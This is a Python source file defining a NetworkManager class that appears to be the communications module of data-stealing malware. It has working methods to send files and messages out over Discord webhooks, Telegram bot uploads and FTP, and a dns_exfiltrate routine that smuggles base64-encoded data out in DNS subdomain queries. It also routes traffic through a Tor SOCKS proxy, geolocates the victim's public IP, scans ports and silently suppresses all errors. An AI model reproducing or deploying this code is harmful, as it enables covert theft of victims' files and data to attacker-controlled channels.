import os
import sys
import json
import time
import base64
import socket
import struct
import random
import string
import threading
import subprocess
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

try:
    import requests
except ImportError:
    pass

try:
    import urllib3
except ImportError:
    pass

try:
    import socks
except ImportError:
    pass

__version__ = "1.0.0"

class NetworkManager:
    def __init__(self, config=None):
        self.config = config or {}
        self.session = None
        self.proxy = None
        self.user_agent = self.config.get(
            "user_agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        self.timeout = self.config.get("request_timeout", 30)
        self.max_retries = self.config.get("max_retries", 5)
        self.retry_delay = self.config.get("retry_delay", 10)
        
    def create_session(self):
        try:
            self.session = requests.Session()
            self.session.headers.update({
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/json"
            })
            
            if self.proxy:
                self.session.proxies.update(self.proxy)
            
            return self.session
        except:
            return None
    
    def set_proxy(self, proxy_type="http", proxy_host="localhost", proxy_port=8080):
        try:
            proxy_url = f"{proxy_type}://{proxy_host}:{proxy_port}"
            self.proxy = {
                "http": proxy_url,
                "https": proxy_url
            }
            
            if self.session:
                self.session.proxies.update(self.proxy)
            
            return True
        except:
            return False
    
    def set_socks5_proxy(self, proxy_host="localhost", proxy_port=9050):
        try:
            proxy_url = f"socks5://{proxy_host}:{proxy_port}"
            self.proxy = {
                "http": proxy_url,
                "https": proxy_url
            }
            
            if self.session:
                self.session.proxies.update(self.proxy)
            
            return True
        except:
            return False
    
    def send_request(self, method="GET", url="", data=None, headers=None, timeout=None):
        if timeout is None:
            timeout = self.timeout
        
        if self.session is None:
            self.create_session()
        
        try:
            request_headers = self.session.headers.copy()
            
            if headers:
                request_headers.update(headers)
            
            if method.upper() == "GET":
                response = self.session.get(url, headers=request_headers, timeout=timeout)
            elif method.upper() == "POST":
                response = self.session.post(url, json=data, headers=request_headers, timeout=timeout)
            elif method.upper() == "PUT":
                response = self.session.put(url, json=data, headers=request_headers, timeout=timeout)
            elif method.upper() == "DELETE":
                response = self.session.delete(url, headers=request_headers, timeout=timeout)
            else:
                response = self.session.request(method, url, json=data, headers=request_headers, timeout=timeout)
            
            return response
        except:
            return None
    
    def send_request_with_retry(self, method="GET", url="", data=None, headers=None):
        for attempt in range(self.max_retries):
            response = self.send_request(method, url, data, headers)
            
            if response and response.status_code < 400:
                return response
            
            if attempt < self.max_retries - 1:
                time.sleep(self.retry_delay * (attempt + 1))
        
        return None
    
    def send_discord_webhook(self, webhook_url, content=None, embeds=None, username=None):
        try:
            data = {}
            
            if content:
                data["content"] = content
            
            if embeds:
                data["embeds"] = embeds
            
            if username:
                data["username"] = username
            
            response = self.send_request("POST", webhook_url, data=data)
            
            return response and response.status_code == 204
        except:
            return False
    
    def send_telegram_message(self, bot_token, chat_id, message):
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message
            }
            
            response = self.send_request("POST", url, data=data)
            
            return response and response.status_code == 200
        except:
            return False
    
    def send_telegram_file(self, bot_token, chat_id, file_path):
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": chat_id}
                
                response = self.session.post(url, files=files, data=data, timeout=self.timeout)
                
                return response and response.status_code == 200
        except:
            return False
    
    def upload_to_ftp(self, ftp_host, username, password, file_path, remote_path=None):
        try:
            from ftplib import FTP
            
            ftp = FTP(ftp_host)
            ftp.login(username, password)
            
            if remote_path is None:
                remote_path = os.path.basename(file_path)
            
            with open(file_path, "rb") as f:
                ftp.storbinary(f"STOR {remote_path}", f)
            
            ftp.quit()
            return True
        except:
            return False
    
    def check_internet_connection(self):
        try:
            response = self.send_request("GET", "https://api.ipify.org", timeout=5)
            return response and response.status_code == 200
        except:
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=5)
                return True
            except:
                return False
    
    def get_public_ip(self):
        try:
            response = self.send_request("GET", "https://api.ipify.org", timeout=5)
            if response and response.status_code == 200:
                return response.text
        except:
            pass
        
        try:
            response = self.send_request("GET", "http://ifconfig.me/ip", timeout=5)
            if response and response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        return "Unknown"
    
    def get_geolocation(self, ip_address=None):
        try:
            if ip_address is None:
                ip_address = self.get_public_ip()
            
            response = self.send_request("GET", f"http://ip-api.com/json/{ip_address}", timeout=5)
            
            if response and response.status_code == 200:
                return response.json()
        except:
            pass
        
        return {}
    
    def encode_data(self, data):
        try:
            if isinstance(data, str):
                data = data.encode()
            
            return base64.b64encode(data).decode()
        except:
            return None
    
    def decode_data(self, data):
        try:
            return base64.b64decode(data.encode())
        except:
            return None
    
    def compress_data(self, data):
        try:
            import zlib
            
            if isinstance(data, str):
                data = data.encode()
            
            compressed = zlib.compress(data)
            return base64.b64encode(compressed).decode()
        except:
            return None
    
    def decompress_data(self, data):
        try:
            import zlib
            
            compressed = base64.b64decode(data.encode())
            return zlib.decompress(compressed)
        except:
            return None
    
    def split_data_for_transfer(self, data, chunk_size=8000):
        chunks = []
        
        if isinstance(data, str):
            data = data.encode()
        
        for i in range(0, len(data), chunk_size):
            chunks.append(data[i:i+chunk_size])
        
        return chunks
    
    def create_dns_query(self, domain):
        try:
            import dns.resolver
            
            answers = dns.resolver.resolve(domain)
            return [str(answer) for answer in answers]
        except:
            return []
    
    def dns_exfiltrate(self, data, domain):
        try:
            encoded_data = self.encode_data(data)
            chunks = self.split_data_for_transfer(encoded_data, 50)
            
            for i, chunk in enumerate(chunks):
                subdomain = f"{i}.{chunk}.{domain}"
                self.create_dns_query(subdomain)
            
            return True
        except:
            return False
    
    def create_tcp_connection(self, host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            return sock
        except:
            return None
    
    def send_tcp_data(self, sock, data):
        try:
            if isinstance(data, str):
                data = data.encode()
            
            sock.sendall(data)
            return True
        except:
            return False
    
    def receive_tcp_data(self, sock, buffer_size=4096):
        try:
            data = sock.recv(buffer_size)
            return data
        except:
            return None
    
    def create_udp_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            return sock
        except:
            return None
    
    def send_udp_data(self, sock, data, host, port):
        try:
            if isinstance(data, str):
                data = data.encode()
            
            sock.sendto(data, (host, port))
            return True
        except:
            return False
    
    def check_port_open(self, host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_ports(self, host, ports=None):
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]
        
        open_ports = []
        
        for port in ports:
            if self.check_port_open(host, port):
                open_ports.append(port)
        
        return open_ports
    
    def get_network_info(self):
        info = {
            "internet_connected": False,
            "public_ip": "Unknown",
            "geolocation": {},
            "open_ports": []
        }
        
        info["internet_connected"] = self.check_internet_connection()
        info["public_ip"] = self.get_public_ip()
        info["geolocation"] = self.get_geolocation(info["public_ip"])
        
        return info

if __name__ == "__main__":
    network = NetworkManager()
    info = network.get_network_info()
    print(json.dumps(info, indent=2, default=str))